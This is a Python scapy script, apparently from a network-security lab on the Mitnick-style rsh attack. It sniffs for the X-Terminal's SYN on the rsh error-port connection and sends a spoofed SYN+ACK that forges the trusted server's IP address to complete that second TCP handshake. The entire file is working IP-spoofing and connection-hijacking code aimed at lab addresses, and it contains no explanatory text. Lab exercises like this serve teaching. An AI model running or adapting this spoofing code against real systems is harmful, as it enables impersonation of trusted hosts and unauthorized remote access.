#!/usr/bin/python3
from scapy.all import *
import subprocess, os

# ----------------------
# Configurable Variables
# ----------------------
X_IP = "10.9.0.5"      # X-Terminal
SRV_IP = "10.9.0.6"    # Trusted server
SRV_PORT = 1023        # rsh source port
ERR_PORT = 9090        # Error port

# ----------------------
# Detect Docker Bridge Interface
# ----------------------
def find_bridge():
    try:
        out = subprocess.check_output(
            "ip -br link | awk '/^br-/{print $1}'",
            shell=True
        ).decode().strip().splitlines()
        if out:
            return out[0]
    except Exception as e:
        print("[!] Bridge auto-detect failed:", e)
    return "lo"

IFACE = os.environ.get("IFACE") or find_bridge()
print(f"[i] Using iface: {IFACE}")

# ----------------------
# Handle SYN packets for 2nd connection
# ----------------------
def on_pkt(pkt):
    if not (IP in pkt and TCP in pkt):
        return
    ip, tcp = pkt[IP], pkt[TCP]

    if (ip.src == X_IP and ip.dst == SRV_IP
        and tcp.flags == "S"
        and tcp.sport == SRV_PORT and tcp.dport == ERR_PORT):

        x_syn_seq = tcp.seq
        srv_seq = RandInt()

        synack = IP(src=SRV_IP, dst=X_IP) / TCP(
            sport=ERR_PORT, dport=SRV_PORT,
            flags="SA", seq=srv_seq, ack=x_syn_seq + 1
        )
        send(synack, verbose=0, iface=IFACE)
        print(f"[+] Sent SYN+ACK for 2nd connection (seq={srv_seq}, ack={x_syn_seq+1})")

        # Wait for ACK to confirm handshake
        bpf_ack = (f"tcp and src host {X_IP} and dst host {SRV_IP} and "
                   f"src port {SRV_PORT} and dst port {ERR_PORT} and tcp[tcpflags] & 0x10 != 0")
        pkts = sniff(filter=bpf_ack, iface=IFACE, timeout=2, count=1)
        if pkts:
            print("[✓] Second connection handshake complete.")

# ----------------------
# Start sniffing
# ----------------------
bpf = (f"tcp and src host {X_IP} and dst host {SRV_IP} and "
       f"src port {SRV_PORT} and dst port {ERR_PORT} and tcp[tcpflags] & 0x02 != 0")
print(f"[i] Sniffing for 2nd-conn SYN on {IFACE} with filter: {bpf}")

sniff(filter=bpf, prn=on_pkt, iface=IFACE, store=0)
